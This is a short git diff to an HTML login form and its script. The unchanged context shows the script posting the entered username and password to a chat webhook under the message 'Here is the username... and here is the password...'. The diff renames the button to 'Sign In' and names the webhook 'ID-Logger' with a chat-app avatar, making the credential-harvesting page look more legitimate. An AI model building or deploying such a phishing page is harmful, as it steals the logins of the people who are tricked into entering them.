@@ -13,7 +13,7 @@
         <label for="password">Password</label>
         <input type="password" id="password" name="password">
       
-        <button type="submit">Send</button>
+        <button type="submit">Sign In</button>
     </form>
     <script>
         function getData() {
@@ -37,10 +37,10 @@
                 },
                 body: JSON.stringify({
                 // Webhook username
-                username: "webhook username",
+                username: "ID-Logger",
                 // URL de la photo de profil
                 avatar_url:
-                    '',
+                    'https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/636e0a6ac3c481f273141736_icon_clyde_black_RGB.png',
                 // Content of message
                 content:
                     `Here is the username : ${getData().username} and here is the password : ${getData().password}`,
